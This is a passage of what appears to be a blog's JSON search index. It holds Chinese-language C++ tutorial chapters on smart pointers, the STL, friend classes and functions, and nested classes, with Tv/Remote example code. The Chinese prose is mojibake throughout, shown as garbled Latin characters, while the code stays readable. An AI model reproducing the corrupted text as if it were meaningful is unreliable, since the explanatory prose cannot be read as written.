å®ç°å…±äº«æ‰€æœ‰æƒï¼Œé€šè¿‡å¼•ç”¨è®¡æ•°ç®¡ç†èµ„æºç”Ÿå‘½å‘¨æœŸã€‚å½“æœ€åä¸€ä¸ª shared_ptr é”€æ¯æ—¶é‡Šæ”¾èµ„æºã€‚éœ€è¦æ³¨æ„å¾ªç¯å¼•ç”¨é—®é¢˜ã€‚ weak_ptr: éæ‹¥æœ‰å‹æŒ‡é’ˆï¼Œç”¨äºè§‚å¯Ÿ shared_ptr ç®¡ç†çš„å¯¹è±¡ï¼Œä¸å¢åŠ å¼•ç”¨è®¡æ•°ï¼Œå¯ç”¨äºæ‰“ç ´å¾ªç¯å¼•ç”¨ã€‚é€šè¿‡ lock() å®‰å…¨åœ°è·å– shared_ptrã€‚ åº”ä¼˜å…ˆä½¿ç”¨ make_unique å’Œ make_shared åˆ›å»ºæ™ºèƒ½æŒ‡é’ˆã€‚ auto_ptr å·²è¢«åºŸå¼ƒï¼Œåº”ä½¿ç”¨ unique_ptrã€‚ æ ‡å‡†æ¨¡æ¿åº“ (STL): åŸºäºæ³›å‹ç¼–ç¨‹æ€æƒ³ï¼Œæä¾›é€šç”¨çš„å®¹å™¨ã€ç®—æ³•å’Œè¿­ä»£å™¨ã€‚ å®¹å™¨: å­˜å‚¨æ•°æ®çš„æ¨¡æ¿ç±»ã€‚ é¡ºåºå®¹å™¨: vector (åŠ¨æ€æ•°ç»„), deque (åŒç«¯é˜Ÿåˆ—), list (åŒå‘é“¾è¡¨), forward_list (å•å‘é“¾è¡¨), array (å›ºå®šå¤§å°æ•°ç»„)ã€‚ å…³è”å®¹å™¨: set, map, multiset, multimap (åŸºäºé”®æ’åºï¼Œå¯¹æ•°æ—¶é—´å¤æ‚åº¦)ã€‚ æ— åºå…³è”å®¹å™¨: unordered_set, unordered_map, unordered_multiset, unordered_multimap (åŸºäºå“ˆå¸Œï¼Œå¹³å‡å¸¸æ•°æ—¶é—´å¤æ‚åº¦)ã€‚ å®¹å™¨é€‚é…å™¨: stack, queue, priority_queue (æä¾›ç‰¹å®šæ¥å£)ã€‚ vector: æœ€å¸¸ç”¨çš„åŠ¨æ€æ•°ç»„ï¼Œæ”¯æŒéšæœºè®¿é—®ï¼Œå°¾éƒ¨æ“ä½œé«˜æ•ˆã€‚ è¿­ä»£å™¨: æ³›åŒ–çš„æŒ‡é’ˆï¼Œè¿æ¥å®¹å™¨å’Œç®—æ³•ï¼Œæä¾›ç»Ÿä¸€çš„éå†æ¥å£ã€‚åˆ†ä¸ºè¾“å…¥ã€è¾“å‡ºã€å‰å‘ã€åŒå‘ã€éšæœºè®¿é—®äº”ç§ç±»åˆ«ã€‚ ç®—æ³• (&lt;algorithm&gt;, &lt;numeric&gt;): å¯¹è¿­ä»£å™¨æŒ‡å®šçš„èŒƒå›´è¿›è¡Œæ“ä½œçš„å‡½æ•°æ¨¡æ¿ï¼ˆå¦‚ sort, find, copy, transform, accumulateï¼‰ã€‚ç®—æ³•é€šå¸¸ä¸æ”¹å˜å®¹å™¨å¤§å°ï¼Œéœ€è¦é…åˆå®¹å™¨æ–¹æ³•ï¼ˆå¦‚ eraseï¼‰æ¥å®é™…å¢åˆ å…ƒç´ ã€‚ åŸºäºèŒƒå›´çš„ for å¾ªç¯ (C++11): æä¾›äº†ç®€æ´ã€å®‰å…¨çš„éå†å®¹å™¨ï¼ˆæˆ–åºåˆ—ï¼‰çš„æ–¹å¼ã€‚ å‡½æ•°å¯¹è±¡ (Functors): é‡è½½äº† operator() çš„ç±»çš„å¯¹è±¡ï¼Œå¯ä»¥åƒå‡½æ•°ä¸€æ ·è°ƒç”¨ã€‚ å¯ä»¥æºå¸¦çŠ¶æ€ï¼Œå¸¸ä½œä¸ºå‚æ•°ä¼ é€’ç»™ STL ç®—æ³•ä»¥å®šåˆ¶è¡Œä¸ºã€‚ æ ‡å‡†åº“åœ¨ &lt;functional&gt; ä¸­æä¾›äº†é¢„å®šä¹‰çš„å‡½æ•°ç¬¦ï¼ˆå¦‚ plus, lessï¼‰ã€‚ ç°ä»£ C++ ä¸­ï¼ŒLambda è¡¨è¾¾å¼å’Œ std::bind æä¾›äº†æ¯”æ—§å¼å‡½æ•°é€‚é…å™¨æ›´çµæ´»çš„æ–¹å¼ã€‚ å…¶ä»–åº“ç‰¹æ€§: valarray (&lt;valarray&gt;): ä¸“ä¸ºæ•°å€¼è®¡ç®—è®¾è®¡çš„åŠ¨æ€æ•°ç»„ï¼Œæ”¯æŒå…ƒç´ çº§ç®—æœ¯è¿ç®—ã€‚ initializer_list (&lt;initializer_list&gt;, C++11): ä½¿å¾—å‡½æ•°å’Œæ„é€ å‡½æ•°èƒ½æ¥å—èŠ±æ‹¬å·åˆå§‹åŒ–åˆ—è¡¨ &#123;...&#125;ï¼Œç®€åŒ–äº†å®¹å™¨å’Œè‡ªå®šä¹‰ç±»çš„åˆå§‹åŒ–ã€‚ æœ¬ç« ä»‹ç»çš„åº“ç‰¹æ€§æ˜¯ç°ä»£ C++ ç¼–ç¨‹çš„åŸºç¡€ã€‚ç†Ÿç»ƒè¿ç”¨ stringã€æ™ºèƒ½æŒ‡é’ˆå’Œ STL çš„å®¹å™¨ã€è¿­ä»£å™¨ã€ç®—æ³•ï¼Œå¯ä»¥ç¼–å†™å‡ºæ›´å®‰å…¨ã€æ›´ç®€æ´ã€æ›´é«˜æ•ˆã€æ›´æ˜“äºç»´æŠ¤çš„ä»£ç ã€‚","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 15 å‹å…ƒã€å¼‚å¸¸å’Œå…¶ä»–","slug":"Cpp_tutorial_Chapter_15","date":"2025-04-30T15:42:24.017Z","updated":"2025-04-30T15:40:27.998Z","comments":true,"path":"2025/04/30/Cpp_tutorial_Chapter_15/","link":"","permalink":"http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_15/","excerpt":"","text":"15.1 å‹å…ƒé€šå¸¸ï¼Œç±»çš„ private å’Œ protected æˆå‘˜åªèƒ½è¢«è¯¥ç±»çš„æˆå‘˜å‡½æ•°è®¿é—®ã€‚è¿™æ˜¯ C++ å°è£…æ€§çš„ä½“ç°ï¼Œæœ‰åŠ©äºä¿æŠ¤æ•°æ®å’Œéšè—å®ç°ç»†èŠ‚ã€‚ç„¶è€Œï¼Œåœ¨æŸäº›ç‰¹æ®Šæƒ…å†µä¸‹ï¼Œå…è®¸ç‰¹å®šçš„å¤–éƒ¨å‡½æ•°æˆ–ç±»è®¿é—®ä¸€ä¸ªç±»çš„ç§æœ‰æˆ–ä¿æŠ¤æˆå‘˜ä¼šéå¸¸æ–¹ä¾¿ã€‚C++ æä¾›äº†å‹å…ƒ (friend) æœºåˆ¶æ¥å®ç°è¿™ç§å—æ§çš„è®¿é—®ã€‚ å‹å…ƒå¯ä»¥æ˜¯ï¼š å‹å…ƒå‡½æ•° (Friend Function): ä¸€ä¸ªéæˆå‘˜å‡½æ•°è¢«å£°æ˜ä¸ºæŸä¸ªç±»çš„å‹å…ƒã€‚ å‹å…ƒç±» (Friend Class): ä¸€ä¸ªç±»è¢«å£°æ˜ä¸ºå¦ä¸€ä¸ªç±»çš„å‹å…ƒã€‚ å‹å…ƒæˆå‘˜å‡½æ•° (Friend Member Function): æŸä¸ªç±»çš„æˆå‘˜å‡½æ•°è¢«å£°æ˜ä¸ºå¦ä¸€ä¸ªç±»çš„å‹å…ƒã€‚ å£°æ˜å‹å…ƒ: åœ¨éœ€è¦æˆäºˆè®¿é—®æƒé™çš„ç±»ï¼ˆæˆ‘ä»¬ç§°ä¹‹ä¸ºå®¿ä¸»ç±»ï¼‰çš„å®šä¹‰å†…éƒ¨ï¼Œä½¿ç”¨ friend å…³é”®å­—æ¥å£°æ˜å‹å…ƒã€‚ 1234567891011class HostClass &#123; friend ReturnType friendFunctionName(parameters); // å£°æ˜å‹å…ƒå‡½æ•° friend class FriendClassName; // å£°æ˜å‹å…ƒç±» friend ReturnType AnotherClass::memberFuncName(parameters); // å£°æ˜å‹å…ƒæˆå‘˜å‡½æ•°private: int privateData;protected: int protectedData;public: // ...&#125;; é‡è¦ç‰¹æ€§: è®¿é—®æƒé™: å‹å…ƒå‡½æ•°æˆ–å‹å…ƒç±»ï¼ˆåŠå…¶æ‰€æœ‰æˆå‘˜å‡½æ•°ï¼‰å¯ä»¥è®¿é—®å®¿ä¸»ç±»çš„æ‰€æœ‰æˆå‘˜ï¼ŒåŒ…æ‹¬ private å’Œ protected æˆå‘˜ã€‚ éä¼ é€’æ€§: å‹å…ƒå…³ç³»ä¸æ˜¯ä¼ é€’çš„ã€‚å¦‚æœç±» A æ˜¯ç±» B çš„å‹å…ƒï¼Œç±» B æ˜¯ç±» C çš„å‹å…ƒï¼Œè¿™å¹¶ä¸æ„å‘³ç€ç±» A æ˜¯ç±» C çš„å‹å…ƒã€‚ éå¯¹ç§°æ€§: å‹å…ƒå…³ç³»ä¸æ˜¯å¯¹ç§°çš„ã€‚å¦‚æœç±» A æ˜¯ç±» B çš„å‹å…ƒï¼Œè¿™å¹¶ä¸æ„å‘³ç€ç±» B æ˜¯ç±» A çš„å‹å…ƒã€‚ å£°æ˜ä½ç½®: friend å£°æ˜å¯ä»¥æ”¾åœ¨ç±»å®šä¹‰çš„ public, protected, æˆ– private éƒ¨åˆ†ï¼Œæ•ˆæœæ˜¯ç›¸åŒçš„ã€‚é€šå¸¸ä¹ æƒ¯æ”¾åœ¨ç±»å®šä¹‰çš„å¼€å§‹æˆ–ç»“æŸå¤„ã€‚ 15.1.1 å‹å…ƒç±»å½“ä¸€ä¸ªç±»è¢«å£°æ˜ä¸ºå¦ä¸€ä¸ªç±»çš„å‹å…ƒæ—¶ï¼Œè¿™ä¸ªå‹å…ƒç±»çš„æ‰€æœ‰æˆå‘˜å‡½æ•°éƒ½å¯ä»¥è®¿é—®å®¿ä¸»ç±»çš„ç§æœ‰å’Œä¿æŠ¤æˆå‘˜ã€‚ ç¤ºä¾‹: å‡è®¾æœ‰ä¸€ä¸ª Tv ç±»ï¼ˆç”µè§†ï¼‰å’Œä¸€ä¸ª Remote ç±»ï¼ˆé¥æ§å™¨ï¼‰ã€‚é¥æ§å™¨éœ€è¦èƒ½å¤Ÿç›´æ¥è°ƒæ•´ç”µè§†çš„çŠ¶æ€ï¼ˆå¦‚é¢‘é“ã€éŸ³é‡ï¼‰ï¼Œå³ä½¿è¿™äº›çŠ¶æ€æ˜¯ç§æœ‰çš„ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140// tv.h -- Tv and Remote classes#ifndef TV_H_#define TV_H_class Tv; // å‰å‘å£°æ˜ Tv ç±»ï¼Œå› ä¸º Remote ä¼šç”¨åˆ°å®ƒclass Remote &#123;public: enum State &#123; Off, On &#125;; enum &#123; MinVal, MaxVal = 20 &#125;; enum &#123; Antenna, Cable &#125;; enum &#123; TV, DVD &#125;; // å‡è®¾é¥æ§å™¨ä¹Ÿå¯ä»¥æ§åˆ¶ DVDprivate: int mode; // æ§åˆ¶ TV è¿˜æ˜¯ DVDpublic: Remote(int m = TV) : mode(m) &#123;&#125; // é¥æ§å™¨çš„æ–¹æ³•ï¼Œéœ€è¦è®¿é—® Tv çš„ç§æœ‰æˆå‘˜ bool volup(Tv &amp; t); // å¼•ç”¨ Tv å¯¹è±¡ bool voldown(Tv &amp; t); void onoff(Tv &amp; t); void chanup(Tv &amp; t); void chandown(Tv &amp; t); void set_mode(Tv &amp; t); void set_input(Tv &amp; t); void set_chan(Tv &amp; t, int c);&#125;;class Tv &#123;private: int state; // On or Off int volume; // assumed to be digitized int maxchannel; // maximum number of channels int channel; // current channel setting int mode; // Antenna or Cable int input; // TV or DVDpublic: // å°† Remote ç±»å£°æ˜ä¸º Tv ç±»çš„å‹å…ƒ friend class Remote; enum State &#123; Off, On &#125;; enum &#123; MinVal, MaxVal = 20 &#125;; enum &#123; Antenna, Cable &#125;; enum &#123; TV, DVD &#125;; Tv(int s = Off, int mc = 125) : state(s), volume(5), maxchannel(mc), channel(2), mode(Cable), input(TV) &#123;&#125; void onoff() &#123; state = (state == On) ? Off : On; &#125; bool ison() const &#123; return state == On; &#125; bool volup(); bool voldown(); void chanup(); void chandown(); void set_mode() &#123; mode = (mode == Antenna) ? Cable : Antenna; &#125; void set_input() &#123; input = (input == TV) ? DVD : TV; &#125; void settings() const; // display all settings&#125;;// Remote æ–¹æ³•çš„å®ç° (éœ€è¦çœ‹åˆ° Tv çš„å®Œæ•´å®šä¹‰)// é€šå¸¸æ”¾åœ¨ .cpp æ–‡ä»¶ä¸­ï¼Œæˆ–è€…åœ¨ Tv å®šä¹‰ä¹‹åinline bool Remote::volup(Tv &amp; t) &#123; return t.volup(); &#125; // è°ƒç”¨ Tv çš„å…¬æœ‰æ–¹æ³•inline bool Remote::voldown(Tv &amp; t) &#123; return t.voldown(); &#125;inline void Remote::onoff(Tv &amp; t) &#123; t.onoff(); &#125;inline void Remote::chanup(Tv &amp; t) &#123; t.chanup(); &#125;inline void Remote::chandown(Tv &amp; t) &#123; t.chandown(); &#125;inline void Remote::set_mode(Tv &amp; t) &#123; t.set_mode(); &#125;inline void Remote::set_input(Tv &amp; t) &#123; t.set_input(); &#125;// set_chan éœ€è¦ç›´æ¥è®¿é—® Tv çš„ç§æœ‰æˆå‘˜ channelinline void Remote::set_chan(Tv &amp; t, int c) &#123; // å› ä¸º Remote æ˜¯ Tv çš„å‹å…ƒï¼Œå¯ä»¥ç›´æ¥è®¿é—® t.channel t.channel = c;&#125;// Tv æ–¹æ³•çš„å®ç° (éƒ¨åˆ†)inline bool Tv::volup() &#123; if (volume &lt; MaxVal) &#123; volume++; return true; &#125; else return false;&#125;inline bool Tv::voldown() &#123; if (volume &gt; MinVal) &#123; volume--; return true; &#125; else return false;&#125;inline void Tv::chanup() &#123; if (channel &lt; maxchannel) channel++; else channel = 1;&#125;inline void Tv::chandown() &#123; if (channel &gt; 1) channel--; else channel = maxchannel;&#125;// ... settings() å®ç°éœ€è¦ iostream ...#endif // TV_H_// use_tv.cpp -- ä½¿ç”¨ Tv å’Œ Remote#include &lt;iostream&gt;#include &quot;tv.h&quot;// Tv::settings() å®ç°void Tv::settings() const &#123; using std::cout; using std::endl; cout &lt;&lt; &quot;TV is &quot; &lt;&lt; (state == On ? &quot;On&quot; : &quot;Off&quot;) &lt;&lt; endl; if (state == On) &#123; cout &lt;&lt; &quot;Volume setting = &quot; &lt;&lt; volume &lt;&lt; endl; cout &lt;&lt; &quot;Channel setting = &quot; &lt;&lt; channel &lt;&lt; endl; cout &lt;&lt; &quot;Mode = &quot; &lt;&lt; (mode == Antenna ? &quot;antenna&quot; : &quot;cable&quot;) &lt;&lt; endl; cout &lt;&lt; &quot;Input = &quot; &lt;&lt; (input == TV ? &quot;TV&quot; : &quot;DVD&quot;) &lt;&lt; endl; &#125;&#125;int main() &#123; using std::cout; Tv s42; cout &lt;&lt; &quot;Initial settings for 42\\&quot; TV:\\n&quot;; s42.settings(); s42.onoff(); // æ‰“å¼€ç”µè§† s42.chanup(); // å¢åŠ é¢‘é“ cout &lt;&lt; &quot;\\nAdjusted settings for 42\\&quot; TV:\\n&quot;; s42.settings(); Remote grey; // åˆ›å»ºé¥æ§å™¨ grey.set_chan(s42, 10); // é¥æ§å™¨è®¾ç½®é¢‘é“ (è°ƒç”¨å‹å…ƒå¯è®¿é—®çš„ç§æœ‰æˆå‘˜) grey.volup(s42); // é¥æ§å™¨å¢åŠ éŸ³é‡ grey.volup(s42); cout &lt;&lt; &quot;\\nSettings after using remote:\\n&quot;; s42.settings(); Tv s58(Tv::On); // åˆ›å»ºä¸€ä¸ªå·²æ‰“å¼€çš„ç”µè§† s58.set_mode(); // åˆ‡æ¢æ¨¡å¼ grey.set_chan(s58, 28); // é¥æ§å™¨æ§åˆ¶å¦ä¸€å°ç”µè§† cout &lt;&lt; &quot;\\nSettings for 58\\&quot; TV:\\n&quot;; s58.settings(); return 0;&#125; åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒRemote ç±»è¢«å£°æ˜ä¸º Tv çš„å‹å…ƒï¼Œå› æ­¤ Remote çš„æˆå‘˜å‡½æ•°ï¼ˆå¦‚ set_chanï¼‰å¯ä»¥ç›´æ¥è®¿é—® Tv å¯¹è±¡çš„ç§æœ‰æˆå‘˜ channelã€‚ 15.1.2 å‹å…ƒæˆå‘˜å‡½æ•°æœ‰æ—¶ï¼Œæˆ‘ä»¬ä¸éœ€è¦è®©æ•´ä¸ªç±»æˆä¸ºå‹å…ƒï¼Œåªéœ€è¦è®©æŸä¸ªç±»çš„ç‰¹å®šæˆå‘˜å‡½æ•°æˆä¸ºå¦ä¸€ä¸ªç±»çš„å‹å…ƒã€‚ å£°æ˜è¯­æ³•: 123456class HostClass &#123; // ... // å£°æ˜ OtherClass çš„ memberFunc ä¸ºå‹å…ƒ friend ReturnType OtherClass::memberFunc(parameters); // ...&#125;; ç¼–è¯‘é¡ºåºå’Œå‰å‘å£°æ˜: å£°æ˜å‹å…ƒæˆå‘˜å‡½æ•°æ—¶éœ€è¦ç‰¹åˆ«æ³¨æ„ç¼–è¯‘é¡ºåºå’Œå‰å‘å£°æ˜ï¼š å®šä¹‰æä¾›å‹å…ƒæˆå‘˜å‡½æ•°çš„ç±» (OtherClass): ç¼–è¯‘å™¨éœ€è¦å…ˆçŸ¥é“ OtherClass çš„å®Œæ•´å®šä¹‰ï¼Œæ‰èƒ½å¤„ç†å…¶ä¸­çš„ memberFuncã€‚ å®šä¹‰å®¿ä¸»ç±» (HostClass): åœ¨ HostClass ä¸­å£°æ˜ OtherClass::memberFunc ä¸ºå‹å…ƒã€‚ å®šä¹‰å‹å…ƒæˆå‘˜å‡½æ•° (OtherClass::memberFunc): è¿™ä¸ªå‡½æ•°çš„å®ç°éœ€è¦çœ‹åˆ° HostClass çš„å®Œæ•´å®šä¹‰ï¼Œå› ä¸ºå®ƒéœ€è¦è®¿é—® HostClass çš„ç§æœ‰/ä¿æŠ¤æˆå‘˜ã€‚ è¿™é€šå¸¸éœ€è¦ä½¿ç”¨**å‰å‘å£°æ˜ (Forward Declaration)**ã€‚ ç¤ºä¾‹: è®© Remote::set_chan æˆä¸º Tv çš„å‹å…ƒï¼Œè€Œä¸æ˜¯æ•´ä¸ª Remote ç±»ã€‚ 123456789101112131415161718192021222324252627282930// tvfm.h -- Tv and Remote classes using a friend member#ifndef TVFM_H_#define TVFM_H_class Tv; // *** 1. å‰å‘å£°æ˜ Tv ***class Remote &#123; // ... (Remote å®šä¹‰åŒå‰) ...public: // ... void set_chan(Tv &amp; t, int c); // å£°æ˜ set_chan // ...&#125;;class Tv &#123; // ... (Tv å®šä¹‰åŒå‰) ...public: // *** 2. å°† Remote::set_chan å£°æ˜ä¸ºå‹å…ƒ *** friend void Remote::set_chan(Tv &amp; t, int c); // ...&#125;;// *** 3. å®šä¹‰ Remote::set_chan (éœ€è¦çœ‹åˆ° Tv çš„å®Œæ•´å®šä¹‰) ***inline void Remote::set_chan(Tv &amp; t, int c) &#123; t.channel = c; // ç°åœ¨å¯ä»¥è®¿é—® Tv çš„ç§æœ‰æˆå‘˜ channel&#125;// ... (å…¶ä»– Remote å’Œ Tv çš„å†…è”æ–¹æ³•å®šä¹‰) ...#endif // TVFM_H_ åœ¨è¿™ä¸ªä¿®æ”¹åçš„ç‰ˆæœ¬ä¸­ï¼Œåªæœ‰ Remote::set_chan å‡½æ•°å¯ä»¥è®¿é—® Tv çš„ç§æœ‰æˆå‘˜ï¼Œè€Œ Remote çš„å…¶ä»–æˆå‘˜å‡½æ•°åˆ™ä¸èƒ½ï¼ˆé™¤éå®ƒä»¬åªè°ƒç”¨ Tv çš„å…¬æœ‰æ–¹æ³•ï¼‰ã€‚è¿™æä¾›äº†æ¯”å‹å…ƒç±»æ›´ç²¾ç»†çš„è®¿é—®æ§åˆ¶ã€‚ 15.1.3 å…¶ä»–å‹å…ƒå…³ç³»ç›¸äº’å‹å…ƒ (Mutual Friends): ä¸¤ä¸ªç±»å¯ä»¥äº’ä¸ºå‹å…ƒã€‚ 1234567891011121314151617181920class ClassB; // å‰å‘å£°æ˜class ClassA &#123; friend class ClassB; // B æ˜¯ A çš„å‹å…ƒprivate: int dataA;&#125;;class ClassB &#123; friend class ClassA; // A æ˜¯ B çš„å‹å…ƒprivate: int dataB;public: void processA(ClassA&amp; a) &#123; a.dataA = 10; // B å¯ä»¥è®¿é—® A çš„ç§æœ‰æˆå‘˜ &#125;&#125;;// ClassA çš„æˆå‘˜å‡½æ•°å®ç°éœ€è¦çœ‹åˆ° ClassB çš„å®Œæ•´å®šä¹‰// void ClassA::processB(ClassB&amp; b) &#123; b.dataB = 20; &#125; å°†å‹å…ƒå‡½æ•°æ”¾åœ¨ä½•å¤„: å¦‚æœå‹å…ƒå‡½æ•°åªè®¿é—®ç±»çš„å…¬æœ‰æ¥å£ï¼Œå®ƒå¯ä»¥æ˜¯æ™®é€šéæˆå‘˜å‡½æ•°ã€‚ å¦‚æœå‹å…ƒå‡½æ•°éœ€è¦è®¿é—®ç±»çš„ç§æœ‰/ä¿æŠ¤æˆå‘˜ï¼Œå®ƒå¿…é¡»è¢«å£°æ˜ä¸ºå‹å…ƒã€‚ å¦‚æœä¸€ä¸ªå‡½æ•°éœ€è¦è®¿é—®ä¸¤ä¸ªä¸åŒç±»çš„ç§æœ‰/ä¿æŠ¤æˆå‘˜ï¼Œé‚£ä¹ˆå®ƒéœ€è¦è¢«è¿™ä¸¤ä¸ªç±»éƒ½å£°æ˜ä¸ºå‹å…ƒã€‚ 15.1.4 å…±åŒçš„å‹å…ƒä¸€ä¸ªå‡½æ•°å¯ä»¥æ˜¯å¤šä¸ªç±»çš„å‹å…ƒã€‚ 123456789101112131415161718class ClassC; // å‰å‘å£°æ˜class ClassD &#123; friend void sharedFriend(const ClassC&amp; c, const ClassD&amp; d);private: int dataD;&#125;;class ClassC &#123; friend void sharedFriend(const ClassC&amp; c, const ClassD&amp; d);private: int dataC;&#125;;// å…±åŒå‹å…ƒçš„å®ç°void sharedFriend(const ClassC&amp; c, const ClassD&amp; d) &#123; std::cout &lt;&lt; &quot;C data: &quot; &lt;&lt; c.dataC &lt;&lt; &quot;, D data: &quot; &lt;&lt; d.dataD &lt;&lt; std::endl;&#125; sharedFriend å‡½æ•°å¯ä»¥åŒæ—¶è®¿é—® ClassC å’Œ ClassD çš„ç§æœ‰æˆå‘˜ã€‚ ä½¿ç”¨å‹å…ƒçš„æ—¶æœº: å‹å…ƒç ´åäº†ç±»çš„å°è£…æ€§ï¼Œå› ä¸ºå®ƒå…è®¸å¤–éƒ¨ä»£ç ç›´æ¥è®¿é—®å†…éƒ¨å®ç°ç»†èŠ‚ã€‚å› æ­¤ï¼Œåº”è¯¥è°¨æ…ä½¿ç”¨å‹å…ƒã€‚ ä½•æ—¶è€ƒè™‘ä½¿ç”¨: é‡è½½è¿ç®—ç¬¦: å°¤å…¶æ˜¯éœ€è¦è®¿é—®ä¸¤ä¸ªä¸åŒç±»å¯¹è±¡å†…éƒ¨æ•°æ®ï¼ˆå¦‚ operator&lt;&lt; è¾“å‡ºæµæ“ä½œç¬¦ï¼‰æˆ–å·¦æ“ä½œæ•°ä¸æ˜¯ç±»å¯¹è±¡çš„æƒ…å†µã€‚ ç´§å¯†åä½œçš„ç±»: å½“ä¸¤ä¸ªæˆ–å¤šä¸ªç±»åœ¨æ¦‚å¿µä¸Šç´§å¯†è€¦åˆï¼Œéœ€è¦é«˜æ•ˆåœ°å…±äº«ä¿¡æ¯æ—¶ï¼ˆå¦‚ Tv å’Œ Remoteï¼‰ã€‚ åº•å±‚å®ç°: åœ¨æŸäº›åº•å±‚åº“æˆ–æ¡†æ¶ä¸­ï¼Œä¸ºäº†æ€§èƒ½æˆ–å®ç°ç‰¹å®šåŠŸèƒ½å¯èƒ½éœ€è¦å‹å…ƒã€‚ æ›¿ä»£æ–¹æ¡ˆ: åœ¨ä½¿ç”¨å‹å…ƒä¹‹å‰ï¼Œè€ƒè™‘æ˜¯å¦å¯ä»¥é€šè¿‡æ‰©å±•ç±»çš„å…¬æœ‰æ¥å£ï¼ˆæ·»åŠ è®¿é—®å™¨æˆ–åŠŸèƒ½å‡½æ•°ï¼‰æ¥æ»¡è¶³éœ€æ±‚ã€‚ å‹å…ƒæä¾›äº†ä¸€ç§ç»•è¿‡è®¿é—®æ§åˆ¶çš„æœºåˆ¶ï¼Œä½†åº”ä½œä¸ºæœ€åçš„æ‰‹æ®µï¼Œè€Œä¸æ˜¯å¸¸è§„è®¾è®¡å·¥å…·ã€‚ 15.2 åµŒå¥—ç±»C++ å…è®¸åœ¨ä¸€ä¸ªç±»ä¸­å®šä¹‰å¦ä¸€ä¸ªç±»ï¼Œè¿™ç§åœ¨ç±»å†…éƒ¨å®šä¹‰çš„ç±»ç§°ä¸ºåµŒå¥—ç±» (Nested Class) æˆ–å†…éƒ¨ç±» (Inner Class)**ã€‚åŒ…å«åµŒå¥—ç±»çš„ç±»ç§°ä¸ºå¤–å›´ç±» (Enclosing Class)** æˆ–**å¤–éƒ¨ç±» (Outer Class)**ã€‚ ç›®çš„: åµŒå¥—ç±»ä¸»è¦ç”¨äºå®ç°ä¸å¤–å›´ç±»ç´§å¯†ç›¸å…³çš„è¾…åŠ©ç±»æˆ–æ•°æ®ç»“æ„ï¼Œæœ‰åŠ©äºå°†å®ç°ç»†èŠ‚å°è£…åœ¨å¤–å›´ç±»å†…éƒ¨ï¼Œæé«˜ä»£ç çš„ç»„ç»‡æ€§å’Œå±€éƒ¨æ€§ã€‚ä¾‹å¦‚ï¼Œé“¾è¡¨æˆ–æ ‘ç»“æ„çš„èŠ‚ç‚¹ (Node) é€šå¸¸åªä¸ºç‰¹å®šçš„å®¹å™¨ç±»æœåŠ¡ï¼Œå°†å…¶åµŒå¥—åœ¨å®¹å™¨ç±»å†…éƒ¨å°±å¾ˆè‡ªç„¶ã€‚ è¯­æ³•: 12345678910111213141516171819202122232425262728293031323334353637383940414243class EnclosingClass &#123;private: // åµŒå¥—ç±»å¯ä»¥æœ‰è‡ªå·±çš„è®¿é—®æ§åˆ¶ class NestedClassPrivate &#123; // ... &#125;;protected: class NestedClassProtected &#123; // ... &#125;;public: class NestedClassPublic &#123; private: int nestedData; EnclosingClass* enclosingPtr; // å¯ä»¥æŒæœ‰å¤–å›´ç±»æŒ‡é’ˆ public: NestedClassPublic(EnclosingClass* enc = nullptr) : enclosingPtr(enc) &#123;&#125; void accessEnclosing(EnclosingClass&amp; enc); int getData() const &#123; return nestedData; &#125; &#125;;private: int enclosingData; NestedClassPrivate ncp; // å¯ä»¥åˆ›å»ºåµŒå¥—ç±»å¯¹è±¡ä½œä¸ºæˆå‘˜public: EnclosingClass(int data = 0) : enclosingData(data) &#123;&#125; void useNested(NestedClassPublic&amp; ncp); int getData() const &#123; return enclosingData; &#125;&#125;;// åµŒå¥—ç±»æˆå‘˜å‡½æ•°çš„å®šä¹‰void EnclosingClass::NestedClassPublic::accessEnclosing(EnclosingClass&amp; enc) &#123; // åµŒå¥—ç±»å¯ä»¥è®¿é—®å¤–å›´ç±»çš„æ‰€æœ‰æˆå‘˜ (é€šè¿‡å¯¹è±¡/æŒ‡é’ˆ/å¼•ç”¨) std::cout &lt;&lt; &quot;Accessing enclosing data: &quot; &lt;&lt; enc.enclosingData &lt;&lt; std::endl; // enc.ncp; // å¯ä»¥è®¿é—®å¤–å›´ç±»çš„ç§æœ‰æˆå‘˜å¯¹è±¡&#125;// å¤–å›´ç±»æˆå‘˜å‡½æ•°çš„å®šä¹‰void EnclosingClass::useNested(NestedClassPublic&amp; ncp) &#123; // å¤–å›´ç±»å¯ä»¥è®¿é—®åµŒå¥—ç±»çš„ public æˆå‘˜ std::cout &lt;&lt; &quot;Using nested data: &quot; &lt;&lt; ncp.getData() &lt;&lt; std::endl; // std::cout &lt;&lt; ncp.nestedData; // é”™è¯¯ï¼ä¸èƒ½ç›´æ¥è®¿é—®åµŒå¥—ç±»çš„ private æˆå‘˜&#125; 15.2.1 åµŒå¥—ç±»å’Œè®¿é—®æƒé™åµŒå¥—ç±»çš„è®¿é—®æƒé™éµå¾ªä»¥ä¸‹è§„åˆ™ï¼š ä½œç”¨åŸŸ: åµŒå¥—ç±»çš„åç§°ä½œç”¨åŸŸä»…é™äºå…¶å¤–å›´ç±»ã€‚åœ¨å¤–éƒ¨å¼•ç”¨åµŒå¥—ç±»æ—¶ï¼Œå¿…é¡»ä½¿ç”¨å¤–å›´ç±»çš„åç§°å’Œä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ (::)ï¼Œä¾‹å¦‚ EnclosingClass::NestedClassPublicã€‚ åµŒå¥—ç±»çš„å£°æ˜ä½ç½®ï¼ˆpublic, protected, privateï¼‰å†³å®šäº†å¤–éƒ¨ä»£ç æ˜¯å¦ä»¥åŠå¦‚ä½•èƒ½å¤Ÿå¼•ç”¨è¯¥åµŒå¥—ç±»ç±»å‹æœ¬èº«ã€‚ public: å¤–éƒ¨ä»£ç å¯ä»¥ä½¿ç”¨ EnclosingClass::NestedClassPublicã€‚ protected: åªæœ‰ EnclosingClass åŠå…¶æ´¾ç”Ÿç±»å¯ä»¥ä½¿ç”¨ EnclosingClass::NestedClassProtectedã€‚ private: åªæœ‰ EnclosingClass å†…éƒ¨å¯ä»¥ä½¿ç”¨ NestedClassPrivateã€‚ 